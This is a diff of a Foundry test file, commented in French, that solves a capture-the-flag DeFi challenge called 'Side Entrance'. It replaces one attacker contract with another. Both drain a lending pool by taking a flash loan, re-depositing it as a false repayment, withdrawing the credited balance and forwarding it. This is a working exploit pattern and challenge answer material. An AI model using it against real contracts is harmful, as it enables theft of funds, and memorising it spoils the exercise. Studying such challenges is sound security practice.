@@ -5,45 +5,36 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
 
-interface ISideEntrancePool {
-    function deposit() external payable;
-    function withdraw() external;
-    function flashLoan(uint256 amount) external;
-}
+contract SideEntranceExploiter {
+    // Contrat attaquant pour exploiter la réentrance
+    SideEntranceLenderPool public pool;
+    address public recovery;
 
-interface IFlashLoanEtherReceiver {
-    function execute() external payable;
-}
-
-contract SideEntranceAttacker is IFlashLoanEtherReceiver {
-    ISideEntrancePool private immutable pool;
-    address payable private immutable recovery;
-
-    constructor(ISideEntrancePool _pool, address payable _recovery) {
+    constructor(SideEntranceLenderPool _pool, address _recovery) {
         pool = _pool;
         recovery = _recovery;
     }
 
-    // Lance l’attaque en UNE séquence: flashLoan -> deposit (dans execute) -> withdraw -> transfert
-    function attack() external {
-        uint256 amount = address(pool).balance;
-        pool.flashLoan(amount);    // ceci déclenchera execute() ci-dessous
-        pool.withdraw();           // récupère tout l’ETH sur CE contrat
-
-        // Envoi tout à recovery
-        (bool ok, ) = recovery.call{value: address(this).balance}("");
-        require(ok, "send failed");
+    function startAttack() public {
+        // 1. On demande un flash loan de tout l'ETH de la pool
+        pool.flashLoan(address(pool).balance);
+        // 3. On withdraw après le flash loan (notre balance interne est remplie)
+        pool.withdraw();
     }
-
-    // Appelée par le pool pendant le flashloan
-    function execute() external payable override {
-        // On redépose tout de suite le montant emprunté:
+    
+    // Callback appelé pendant le flash loan
+    function execute() public payable {
+        // 2. Pendant le flash loan, on re-deposit l'ETH reçu
+        // Ça met à jour notre balance interne mais l'ETH reste dans la pool
+        // Du point de vue de la pool, on a "remboursé" le flash loan
         pool.deposit{value: msg.value}();
     }
 
-    receive() external payable {}
+    receive() external payable {
+        // 4. On transfère l'ETH récupéré vers recovery
+        payable(recovery).transfer(address(this).balance);
+    }
 }
-
 
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -85,15 +76,9 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        // Déploie le contrat d’attaque hors du prank si nécessaire, puis appelle une seule fois attack() en player
-        vm.stopPrank();
-        SideEntranceAttacker attacker = new SideEntranceAttacker(
-            ISideEntrancePool(address(pool)),
-            payable(recovery)
-        );
-
-        vm.startPrank(player, player);
-        attacker.attack();
+        // On déploie et exécute l'exploit de réentrance
+        SideEntranceExploiter exploiter = new SideEntranceExploiter(pool, recovery);
+        exploiter.startAttack();
     }
 
     /**
